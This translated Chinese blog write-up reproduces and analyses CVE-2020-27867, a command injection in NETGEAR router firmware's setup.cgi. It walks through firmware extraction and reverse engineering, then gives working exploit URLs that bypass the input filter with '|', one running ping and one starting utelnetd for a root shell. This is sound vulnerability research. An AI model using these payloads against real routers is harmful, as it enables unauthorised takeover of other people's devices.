# CVE-2020-27867: NETGEAR 路由器远程代码执行漏洞复现及简要分析

## 译文声明
本文为翻译文章，具体内容表达及含义以原文为准。

## 0x00. 引言
**NETGEAR** 是一家专注于网络设备的公司。在2020年末，其多款路由器产品被发现存在远程代码执行（RCE）漏洞。该漏洞源于mini_httpd服务对“帆游加速器”功能参数解析时存在的缺陷，导致可以进行命令注入，从而在远程主机上执行任意代码。尽管利用此漏洞需要身份验证，但现有的身份验证机制并不难绕过。

在 [cve.mitre.org](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27867) 上对该漏洞的描述如下：
> 此漏洞允许相邻网络攻击者在受影响的NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, 和 Nighthawk AC2400路由器上执行任意代码。虽然利用此漏洞需要身份验证，但现有的身份验证机制可以被绕过。具体缺陷存在于默认监听TCP端口80的mini_httpd服务中。当解析funjsq_access_token参数时，进程未正确验证用户提供的字符串即使用它来执行系统调用。攻击者可以利用此漏洞以root权限执行代码。ZDI-CAN-11653。

### 影响版本
参见[官网](https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers)

### 复现环境搭建
由于经济原因，笔者无法购买NETGEAR路由器，最终从朋友那里借到了一台R6800型号的设备，得以复现该漏洞。

## 0x01. 漏洞分析
### 文件提取
首先从[官网](https://www.netgear.com/support/product/R6800.aspx#Firmware%20Version%201.2.0.74)下载对应版本（1.2.0.74）的固件，解压后得到一个img镜像文件。使用binwalk工具提取其中的内容：

```bash
$ binwalk -e
```

得到两个文件 `200.zip` 和 `R6950.bin`，其中前者是后者的压缩包。继续使用binwalk解压后者，得到的 `squashfs-root` 文件夹便是该设备的文件系统。

文件系统中包含大量软链接，大部分指向 `usr/sbin` 目录，相应地 `init` 进程指向的是 `usr/sbin/busybox`。

```bash
$ ll
total 84
drwxr-xr-x 12 arttnba3 arttnba3  4096 Aug 18 20:14 ./
drwxrwxr-x  3 arttnba3 arttnba3  4096 Aug 18 20:56 ../
lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 bin -> usr/sbin//
drwxrwxr-x  2 arttnba3 arttnba3  4096 Aug 15  2015 data/
drwxr-xr-x  2 arttnba3 arttnba3  4096 Oct 18  2015 dev/
lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 etc -> /tmp/etc
lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 etc_ro -> /tmp/etc_ro
lrwxrwxrwx  1 arttnba3 arttnba3    20 Aug 17  2020 home -> /tmp/home_directory/
lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 init -> bin/busybox*
drwxr-xr-x  6 arttnba3 arttnba3 12288 Aug 17  2020 lib/
drwxr-xr-x  2 arttnba3 arttnba3  4096 Dec  2  2012 media/
lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 mnt -> /tmp/mnt
drwxrwxr-x  6 arttnba3 arttnba3  4096 Aug 17  2020 opt/
drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 12  2000 proc/
lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 sbin -> usr/sbin//
drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 16  2008 sys/
drwxr-xr-x  2 arttnba3 arttnba3  4096 Jul 28  2000 tmp/
drwxr-xr-x 11 arttnba3 arttnba3  4096 Aug 18 18:59 usr/
lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 var -> /tmp/var
lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 www -> /tmp/www
drwxrwxr-x  8 arttnba3 arttnba3 32768 Aug 17  2020 www.eng/
```

在 `usr` 目录下还有一个文件 `funjsq_plugin_netgear_r6800.tar.gz`，解压：

```bash
$ tar -zxvf funjsq_plugin_netgear_r6800.tar.gz
```

### 程序分析
根据漏洞通告，该漏洞存在于 `mini_httpd` 服务中。通过 `burp suite` 测试发现，大多数HTTP请求都是通过 `setup.cgi` 进行的，该文件位于 `/usr/sbin/` 目录下。

将 `setup.cgi` 导入IDA进行分析，并查找 `funjsq_access_token` 字符串。XREF 到 `sub_407C80()` 函数，该函数通过 `find_val()` 提取 `funjsq_access_token` 参数，然后拼接命令并通过 `COMMAND()`（本质上是sh）执行。若能插入分隔符如 `;` 或 `&&`，则可以执行任意命令，从而存在命令注入的RCE漏洞。

通过调用回溯，发现一个函数表结构，其中 `sub_407C80()` 对应 `funjsq_login`：

```c
struct StrFunc {
    char *func_name;
    void (*func_ptr)();
};
```

在 `CallActionByName()` 函数中，会根据传入的字符串通过函数表调用对应的函数。最终，在main函数中，对于传入的 `todo` 参数，会调用 `CallActionByName()` 进行解析。主要针对POST请求有一系列检查，可以通过GET请求绕过这些检查。

最终，通过以下payload可以跳转到有问题的 `sub_407C80()` 函数：

```http
http://192.168.1.1/setup.cgi?todo=funjsq_login&next_file=basic_wait.htm&funjsq_access_token=
```

尽管 `find_val()` 中有一些命令注入过滤，但功能较弱。

## 0x02. 漏洞利用
该漏洞仅限于已验证用户（可以登录路由器页面）。常规情况下，还需要绕过用户验证。本篇假设已经成功绕过路由器登录页面。

### PoC
在mini_httpd服务中似乎有一定的过滤机制，如 `;`、`&&`、`||` 等会被过滤并返回403。最终，笔者使用 `|` 成功绕过，并选择执行 `ping` 命令查看效果：

```http
http://192.168.1.1/setup.cgi?todo=funjsq_login&next_file=basic_wait.htm&funjsq_access_token=|ping%20-c5%20sec.arttnba3.cn
```

若成功进入执行命令的流程，则应有如下回显，表示代码成功执行：

```bash
$ tcpdump -i eth0 icmp
```

在服务器上查看发现确实收到了来自该路由器的ping包，命令执行成功。

需要注意的是，`COMMAND()` 执行命令时会等待其返回才会执行下一条命令。若需同时执行多个命令，应使用 `&`（URL编码 `%26`）将一些长期执行的命令转入后台执行。

### Exploit
这台设备自带 `telnet`，可以直接通过telnet连接上去：

```http
http://192.168.1.1/setup.cgi?todo=funjsq_login&next_file=basic_wait.htm&funjsq_access_token=|utelnetd%26
```

运行后，成功通过telnet连接获取到一个shell。

## 0xFF. 总结
通过分析这个漏洞，我们不难发现其逻辑非常简单。至少就其利用难度而言，这是一个比较初级的错误。然而，考虑到背后是美国网件公司——一家规模巨大的网络设备公司，这样的安全问题令人担忧。

Netgear是否真的不重视安全问题？似乎并非如此。在上面的分析中，我们可以看到固件中确实存在针对代码注入的风险检测，但检测机制十分简陋，似乎并没有给予足够的重视。或许只是为了KPI，但如果连这样的大公司都不够注重安全问题，那么小公司又如何呢？我们是否生活在一个充满漏洞的世界？

反思一下，在大学的C语言入门课上，大家最初学到的读入字符串的函数之一是 `gets` 还是 `fgets`？是否有老师说明过在 `scanf` 中不要使用 `%s`？在工程代码中使用 `printf` 直接打印字符串时是否意识到格式字符串漏洞的存在？

笔者认为，“安全问题本质上还是人的问题”。只有每一位开发者都真正重视起安全问题，许多不必要的损失才能得以避免。